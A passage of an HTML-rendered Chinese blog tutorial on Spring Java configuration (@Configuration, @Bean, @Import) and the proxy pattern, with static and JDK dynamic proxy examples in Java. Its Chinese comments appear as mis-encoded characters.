class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Value;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-comment">//@Component è¯´æ˜è¿™ä¸ªç±»è¢« Spring å®¹å™¨ç®¡ç†</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-comment">//å±æ€§æ³¨å…¥å€¼</span><br>    <span class="hljs-meta">@Value(&quot;123&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.config;<br><br><span class="hljs-keyword">import</span> com.kuang.pojo.User;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.ComponentScan;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Import;<br><br><span class="hljs-comment">//ä¹Ÿä¼šè¢« Spring å®¹å™¨ç®¡ç†ï¼Œå› ä¸ºå®ƒæœ¬æ¥å°±æ˜¯ä¸€ä¸ª @Component</span><br><span class="hljs-comment">//@Configuration ä»£è¡¨è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªé…ç½®ç±»ï¼Œå’Œ xml é…ç½®æ–‡ä»¶ä½œç”¨ä¸€æ ·</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@ComponentScan(&quot;com.kuang.pojo&quot;)</span><br><span class="hljs-comment">//å¯¼å…¥åˆå¹¶å…¶ä»–é…ç½®ç±»ï¼Œç±»ä¼¼äºé…ç½®æ–‡ä»¶ä¸­çš„ inculde æ ‡ç­¾</span><br><span class="hljs-meta">@Import(Config2.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span> &#123;<br><br>    <span class="hljs-comment">//æ³¨å†Œä¸€ä¸ª Bean,ç›¸å½“äºä¹‹å‰å†™çš„ bean æ ‡ç­¾</span><br>    <span class="hljs-comment">//è¿™ä¸ªæ–¹æ³•çš„åå­—ï¼Œç›¸å½“äº bean æ ‡ç­¾çš„ id</span><br>    <span class="hljs-comment">//è¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼ï¼Œç›¸å½“äº bean æ ‡ç­¾çš„ class</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//new User() ç›¸å½“äºä¹‹å‰å†™çš„ &lt;bean class=&quot;com.kuang.pojo.User&quot;/&gt;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config2</span> &#123;<br>&#125;<br><span class="hljs-keyword">import</span> com.kuang.config.Config;<br><span class="hljs-keyword">import</span> com.kuang.pojo.User;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//å¦‚æœå®Œå…¨ä½¿ç”¨äº†é…ç½®ç±»æ–¹å¼å»åšï¼Œå°±åªèƒ½é€šè¿‡ AnnotationConfigApplicationContext æ¥è·å– Beanå®¹å™¨ï¼Œé€šè¿‡é…ç½®ç±»çš„ class æ¥è·å–</span><br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>(Config.class);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">getUser</span> <span class="hljs-operator">=</span> (User) context.getBean(<span class="hljs-string">&quot;getUser&quot;</span>);<br>        System.out.println(getUser.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3ã€ä»£ç†æ¨¡å¼"><a href="#3ã€ä»£ç†æ¨¡å¼" class="headerlink" title="3ã€ä»£ç†æ¨¡å¼"></a>3ã€ä»£ç†æ¨¡å¼</h1><p><strong>ä»£ç†æ¨¡å¼å³ SpringAOP çš„åº•å±‚</strong></p><p><strong>ä»£ç†æ¨¡å¼åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†</strong></p><p>åŸå‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749099.png" alt="img"> </p><h2 id="3-1-é™æ€ä»£ç†"><a href="#3-1-é™æ€ä»£ç†" class="headerlink" title="3.1 é™æ€ä»£ç†"></a>3.1 <strong>é™æ€ä»£ç†</strong></h2><p>è§’è‰²åˆ†æï¼š</p><ul><li>æŠ½è±¡è§’è‰² ï¼š ä¸€èˆ¬ä¼šä½¿ç”¨æ¥å£æˆ–è€…æŠ½è±¡ç±»æ¥è§£å†³</li><li>çœŸå®è§’è‰² ï¼šè¢«ä»£ç†è§’è‰²</li><li>ä»£ç†è§’è‰² ï¼šä»£ç†çœŸå®è§’è‰²ï¼Œ</li><li>å®¢æˆ· ï¼šè®¿é—®ä»£ç†å¯¹è±¡çš„äºº</li></ul><p>ä»£ç†æ¨¡å¼çš„å¥½å¤„ï¼š</p><ul><li>å¯ä»¥ä½¿çœŸå®è§’è‰²çš„æ“ä½œæ›´åŠ çº¯ç²¹ï¼Œä¸ç”¨å…³æ³¨ä¸€äº›å…¬å…±çš„ä¸šåŠ¡</li><li>å…¬å…±ä¹Ÿäº¤ç»™ä»£ç†è§’è‰²ï¼Œå®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥</li><li>å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•çš„æ—¶å€™ï¼Œæ–¹ä¾¿é›†ä¸­ç®¡ç†</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>ä¸€ä¸ªçœŸå®è§’è‰²å°±ä¼šäº§ç”Ÿä¸€ä¸ªä»£ç†è§’è‰²ï¼Œä»£ç é‡ç¿»å€ï¼Œå¼€å‘æ•ˆç‡ä¼šå˜ä½</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//ç§Ÿæˆ¿</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br><br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//æˆ¿ä¸œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//æˆ¿ä¸œè¦ç§Ÿæˆ¿å­</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//ä»£ç†ï¼Œä¸­ä»‹å¸®æˆ¿ä¸œç§Ÿæˆ¿å­ï¼Œä½†æ˜¯ä»£ç†ä¼šæœ‰ä¸€äº›é™„å±æ“ä½œ</span><br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);<br>        <span class="hljs-comment">//ä½ ä¸ç”¨é¢å¯¹æˆ¿ä¸œï¼Œç›´æ¥æ‰¾ä¸­ä»‹ç§Ÿæˆ¿å­</span><br>        proxy.rent();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-keyword">private</span> Host  host;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span> &#123;<br>        <span class="hljs-built_in">this</span>.host = host;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        host.rent();<br>        seeHouse();<br>        fare();<br>        hetong();<br>    &#125;<br><br>    <span class="hljs-comment">//çœ‹æˆ¿</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//æ”¶ä¸­ä»‹è´¹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹æ”¶å–ä¸­ä»‹è´¹&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//ç­¾ç§ŸèµåˆåŒ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hetong</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹ç­¾ç§ŸèµåˆåŒ&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749440.png" alt="img"></p><p>å¦ä¸€ä¾‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-comment">//çœŸå®å¯¹è±¡</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¢åŠ äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¿®æ”¹äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;add&quot;</span>);<br>        userService.add();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;delete&quot;</span>);<br>        userService.delete();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;update&quot;</span>);<br>        userService.update();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;query&quot;</span>);<br>        userService.query();<br>    &#125;<br><br>    <span class="hljs-comment">//æ—¥å¿—æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Debug] ä½¿ç”¨äº†&quot;</span>+msg+<span class="hljs-string">&quot;æ–¹æ³•&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//ä»£ç†ç±»</span><br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();<br>        <span class="hljs-comment">//ä½¿ç”¨ä»£ç†ç±»å®ç°æ—¥å¿—åŠŸèƒ½ï¼</span><br>        proxy.setUserService(userService);<br>        proxy.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä¸æ”¹å˜åŸæ¥çš„ä»£ç çš„æƒ…å†µä¸‹ï¼Œå®ç°äº†å¯¹åŸæœ‰åŠŸèƒ½çš„å¢å¼ºï¼Œè¿™æ˜¯AOPä¸­æœ€æ ¸å¿ƒçš„æ€æƒ³</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753869.png" alt="img"></p><h2 id="3-2-åŠ¨æ€ä»£ç†"><a href="#3-2-åŠ¨æ€ä»£ç†" class="headerlink" title="3.2 åŠ¨æ€ä»£ç†"></a>3.2 åŠ¨æ€ä»£ç†</h2><ul><li><p>åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†è§’è‰²ä¸€æ ·</p></li><li><p>åŠ¨æ€ä»£ç†çš„ä»£ç†ç±»æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œä¸æ˜¯æˆ‘ä»¬ç›´æ¥å†™å¥½çš„</p></li><li><p>åŠ¨æ€ä»£ç†åˆ†ä¸ºä¿©å¤§ç±»ï¼šåŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†ï¼ŒåŸºäºç±»çš„åŠ¨æ€ä»£ç†</p></li><li><ul><li>åŸºäºæ¥å£â€“JDK åŠ¨æ€ä»£ç†</li><li>åŸºäºç±»â€“cglib</li><li>java å­—èŠ‚ç å®ç°ï¼šjavasist</li></ul></li></ul><p>äº†è§£ä¿©ä¸ªç±»ï¼š</p><ul><li>Proxyï¼šä»£ç†</li><li>InvocationHandlerï¼šè°ƒç”¨å¤„ç†ç¨‹åº</li></ul><p><strong>åŠ¨æ€ä»£ç†çš„å¥½å¤„</strong></p><p>é™æ€ä»£ç†æœ‰çš„å®ƒéƒ½æœ‰ï¼Œé™æ€ä»£ç†æ²¡æœ‰çš„ï¼Œå®ƒä¹Ÿæœ‰ï¼</p><ul><li>å¯ä»¥ä½¿å¾—æˆ‘ä»¬çš„çœŸå®è§’è‰²æ›´åŠ çº¯ç²¹ . ä¸å†å»å…³æ³¨ä¸€äº›å…¬å…±çš„äº‹æƒ… .</li><li>å…¬å…±çš„ä¸šåŠ¡ç”±ä»£ç†æ¥å®Œæˆ . å®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥ ,</li><li>å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•æ—¶å˜å¾—æ›´åŠ é›†ä¸­å’Œæ–¹ä¾¿ .</li><li>ä¸€ä¸ªåŠ¨æ€ä»£ç† , ä¸€èˆ¬ä»£ç†æŸä¸€ç±»ä¸šåŠ¡</li><li>ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯ä»¥ä»£ç†å¤šä¸ªç±»ï¼Œä»£ç†çš„æ˜¯æ¥å£ï¼</li></ul><p>æ¡ˆä¾‹ä¸€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//æˆ¿ä¸œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//ç§Ÿæˆ¿</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//ä½¿ç”¨æ­¤ç±»è‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//è¢«ä»£ç†çš„æ¥å£</span><br>    <span class="hljs-keyword">private</span> Rent rent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRent</span><span class="hljs-params">(Rent rent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.rent = rent;<br>    &#125;<br><br>    <span class="hljs-comment">//ç”Ÿæˆå¾—åˆ°ä»£ç†ç±»</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      rent.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//å¤„ç†ä»£ç†å®ä¾‹ï¼Œå¹¶è¿”å›ç»“æœ</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//åŠ¨æ€ä»£ç†çš„æœ¬è´¨ï¼Œå°±æ˜¯ä½¿ç”¨åå°„æœºåˆ¶å®ç°</span><br>        seeHouse();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> method.invoke(rent, args);<br>        <span class="hljs-comment">//return method.invoke(rent, args);</span><br>        fare();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹å¸¦çœ‹æˆ¿å­&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ”¶ä¸­ä»‹è´¹&quot;</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span 